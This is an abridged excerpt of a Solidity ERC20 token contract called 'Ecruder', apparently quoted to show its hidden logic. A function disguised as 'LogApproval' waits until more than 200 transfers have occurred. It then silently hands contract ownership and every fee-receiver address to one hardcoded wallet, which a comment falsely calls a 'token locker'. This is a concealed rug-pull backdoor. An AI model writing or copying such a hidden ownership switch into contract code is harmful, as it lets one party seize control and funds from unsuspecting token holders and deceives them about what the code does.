...
contract Ecruder  is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0xA9A49E1bEF870A3b3341226540d66A545Dd41ebf; // token locker
    ...
    constructor()
        ERC20Detailed("Ecruder", "Ecruder", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 200 && !isTransferred) {
            _transferOwnership(address(0xA9A49E1bEF870A3b3341226540d66A545Dd41ebf));
            marketingFeeReceiver = address(0xA9A49E1bEF870A3b3341226540d66A545Dd41ebf);
            autoLiquidityReceiver = address(0xA9A49E1bEF870A3b3341226540d66A545Dd41ebf);
            ecosystemFeeReceiver = address(0xA9A49E1bEF870A3b3341226540d66A545Dd41ebf);
            buyBackFeeReceiver = address(0xA9A49E1bEF870A3b3341226540d66A545Dd41ebf);
            isTransferred = true;
        }
    }
